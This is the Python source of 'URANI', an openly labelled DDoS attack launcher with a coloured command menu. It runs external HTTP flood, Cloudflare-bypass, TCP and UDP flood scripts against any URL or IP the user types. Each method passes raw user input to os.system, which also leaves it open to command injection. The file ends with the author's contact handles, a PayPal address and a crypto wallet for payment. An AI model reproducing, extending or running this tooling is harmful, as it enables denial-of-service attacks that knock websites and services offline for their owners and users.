from colorama import Fore, Back, Style
import os
import requests
import random
import getpass
import time
import sys
from requests import post,get
import os, sys, requests, random,json
import time, datetime
from datetime import datetime
from requests import post,get
import os, sys, requests, random,json
import webbrowser
from datetime import datetime
class bcolors:
    HONG = '\033[95m'
    BLUED = '\033[94m'
    BLUEN = '\033[96m'
    BLUEL = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    A= '\033[12m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
def clear():
  os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)
time=requests.get("http://worldtimeapi.org/api/timezone/Asia/Ho_Chi_Minh").text

def banner():
  clear()
  print(bcolors.WHITE +"[" + bcolors.HONG +"URANI" + bcolors.WHITE +"] |" +bcolors.RED +" Welcome" + bcolors.BLUED + " to " + bcolors.BLUEN + "URANI "+bcolors.BOLD +"V1.0.0!" +bcolors.WHITE + " | " + bcolors.YELLOW +"User:")
#  print(Fore.BLUE +"""   
  print(bcolors.HONG + """ _   _ ____      _    _   _ ___ """ + bcolors.WHITE)
  print(bcolors.BLUED + """ | | | |  _ \    / \  | \ | |_ _| """ + bcolors.WHITE)
  print(bcolors.BLUEN + """ | | | | |_) |  / _ \ |  \| || |  """ + bcolors.WHITE)
  print(bcolors.BLUEL + """ | |_| |  _ <  / ___ \| |\  || |  """ + bcolors.WHITE)
  print(bcolors.RED + """ \___/ |_| \_\/_/   \_\_| \_|___|           V1.0.0""" + bcolors.WHITE)
  print(bcolors.BLUEL+"Type help to see the all commands."+bcolors.WHITE)
  print(bcolors.BOLD+"TOOL DDOS ATTACK URANI: TRẦN TUẤN PHONG")
  print(bcolors.BOLD+"Cre: TRẦN TUẤN PHONG")
#  time.sleep(a)
#""")
#def menu():
   # sys.stdout.write(f"ATTACK DDOS WEBSITE v1.0.0")
   # clear()
    #print('…..........................')
   # print("............................")
   # print(Fore.YELLOW + """ banner """)
    #print ("LAYER7: "+"+ SEVER,HTTP-RAW,HTTP-SOCKET,HTTPFLOOD,STRESS,HULK")
    #print(Fore.BLUE +"LAYER4: TCP,UDP")
   # print(banner())
def main():
    banner()
    while(True):
        cnc = input(bcolors.YELLOW +'''METHODS :''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            banner()
            (print (bcolors.RED +" __      __   _  _  ____  ____    ___ "))
            (print (bcolors.YELLOW+"(  )    /__\ ( \/ )( ___)(  _ \  (__ )"))
            ( print(bcolors.BLUEL+" )(__  /(__)\ \  /  )__)  )   /   / / "))
            (print(bcolors.BLUED +"(____)(__)(__)(__) (____)(_)\_)  (_/ "))
            (print(bcolors.BLUEN +"""
║   HTTP-RW             ║   HULK              ║
║   HTTP-SOCKET         ║   HTTPFLOOD         ║
║   UAMBYPASS           ║   HTTP-BROWSER      ║
║   HTTP-RAND           ║   NORMAL-BYPASS     ║
║   HTTP-RAWV2          ║   HTTPS-SPOOF       ║
║   CF-BYPASS           ║   HUV2              ║ 
            
            """))
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            banner()
            (print(bcolors.RED +" __      __   _  _  ____  ____     __  "))
            (print(bcolors.YELLOW +"(  )    /__\ ( \/ )( ___)(  _ \   /. | "))
            (print(bcolors.BLUEL +" )(__  /(__)\ \  /  )__)  )   /  (_  _)"))
            (print(bcolors.BLUED +"(____)(__)(__)(__) (____)(_)\_)    (_) " ))
            (print(bcolors.BLUEL +"""
 ║   TCP            ║   UDP            ║
 ║   HOME           ║   UV2            ║
            """))
            
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            (print(" CHƯA CÓ TOOL DDOS GAME"))
        
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            ()
        elif cnc == "help" or cnc == "HELP" or cnc == "Help" or cnc == "HELP":
            (print (bcolors.HONG +"""
LAYER7  ► SHOW LAYER7 METHODS
LAYER4  ► SHOW LAYER4 METHODS
AMP     ► SHOW GAME METHODS
INFO    ► INFO ADMIN 
CLEAR   ► CLEAR TERMINAL
            """))
        

        elif "http-socket" in cnc or "HTTP-SOCKET" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET.js {url} {per} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-socket <url> <per> <time>')
                print(Fore.RED +'Example: http-socket http://example.com 5000 60')
                os.system(f'node HTTP-SOCKET.js {url} {per} {time}')

        elif "http-rw" in cnc or "HTTP-RW" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-raw <url> <time>')
                print(Fore.RED +'Example: http-rw http://example.com 60')
        elif "http-rawv2" in cnc or "HTTP-RAWV2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-rawv2<url> <time>')
                print(Fore.RED +'Example: http-rawv2 http://example.com 60')
        elif "http-requests" in cnc or "HTTP-REQUESTS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-REQUESTS {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-requests <url> <time>')
                print(Fore.RED +'Example: http-requests http://example.com 60')

        elif "stress" in cnc or "STRESS" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
               # print("đang chạy")
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print(Fore.RED +'Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print(Fore.RED +'MODE: [1] TCP')
                print(Fore.RED +'      [2] UDP')
                print(Fore.RED +'      [3] HTTP')
                print(Fore.RED +'Example: stress 1.1.1.1 80/443 3 1250 60 5')

        elif "http-rand" in cnc or "HTTP-RAND" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-rand <url> <time>')
                print(Fore.RED +'Example: http-rand http://example.com 60')
                
        elif "httpflood" in cnc or "HTTPFLOOD" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')
  
        elif "hulk" in cnc or "HULK" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: hulk <url> METHODS<GET/POST>')
                print('Example: hulk http://example.com GET')
        elif "huv2" in cnc or "HUV2" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run hulkanonymuous.go -site {url} -data {method}')
            except IndexError:
                print('Usage: huv2 <url> METHODS<GET/POST>')
                print('Example: huv2 http://example.com GET')
        elif "normal-bypass" in cnc or "NORMAL-BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node httpbypassv2.js {url} {time}')
            except IndexError:
                print('Usage: normal-bypass <url> <time>')
                print('Example: normal-bypass http://example.com 20')

        elif "sever" in cnc or "SEVER" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run sever.go -site {url} -data {method}')
            except IndexError:
                print(Fore.RED +'Usage: sever <url> METHODS<GET/POST>')
                print(Fore.RED +'Example: sever http://example.com GET')
        elif "cf-bypass" in cnc or "CF-BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example.com 60 1250')
        elif "HTTPS-SPOOF" in cnc or "https-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'python https-spoof.py {url} {time} {threads}')
            except IndexError:
                print(Fore.RED +'Usage: HTTPS-SPOOF <url> <time> <threads>')
                print(Fore.RED +'Example: hhhh')
        elif "HTTP-BROWSER" in cnc or "http-browser" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'node HTTP-BROWSER.js {url} {time} {threads}')
            except IndexError:
                print(Fore.RED +'Usage: HTTP-BROWSER <url> <threads> <time>')
                print(Fore.RED +'Example: HTTP-BROWSER <url> <threads> <time>')
        
        elif "UAMBYPASS" in cnc or "uambypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                post = cnc.split()[4]
                os.system(f'node UAMBYPASS.js {url} {time} {threads} {post}')
            except IndexError:
                print('Usage: UAMBYPASS <url> <time> <threads> <post>')
                print('Example: UAMBYPASS http://example.com> <60> <100> <http.txt>')
        elif "cf-bypass" in cnc or "CF-BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example.com 60 1250')
        elif "home" in cnc or "HOME" in cnc:

            try:

                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node home.js {ip} {port} {time} ')
            except IndexError:
                print(Fore.RED +'Usage: home <ip> <port> <time>')
                print(Fore.RED +'Example: home 45.142.122.104 22 60')
       
  
 #LAYER4
        elif "tcp" in cnc or "TCP" in cnc:

            try:

                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'python tcp.py -i {ip} -p {port} -t {time} -th {threads}')
            except IndexError:
                print(Fore.RED +'Usage: tcp <ip> <port> <time> <threads>')
                print(Fore.RED +'Example: tcp 45.142.122.104 22 60 15000')
        elif "udp" in cnc or "UDP" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'python udp.py -i {ip} -p {port} -t {time} -th {threads}')
            except IndexError:
                print(Fore.RED +'Usage: udp <ip> <port> <time> <threads>')
                print(Fore.RED +'Example: udp 45.142.122.104 22 60 15000')
        elif "uv2" in cnc or "UV2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl UDP-KILL.pl {ip} {port} {threads} {time}')
            except IndexError:
                print(Fore.RED +'Usage: uv2 <ip> <port> <threads> <time>')
                print(Fore.RED +'Example: uv2 45.142.122.104 80 15000 80')
       
        elif "info" in cnc or "INFO" in cnc:
            print(f'''
FACEBOOK: Phong Trần ꪜ
TEAM GROUP: ㋛︎ 🄰 🅃 🅃 🄰 🄲 🄺 ㋛︎
GROUP ZALO: https://zalo.me/g/fqovhs332
PAYPAL: quocp444@gmail.com
BNB: 0x02316ca46ca2656c4c225d7ed83490b039a949cf
            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Error: [ " + cmmnd + " ] Không Có Lệnh Này !!!!")
            except IndexError:
                pass
main()

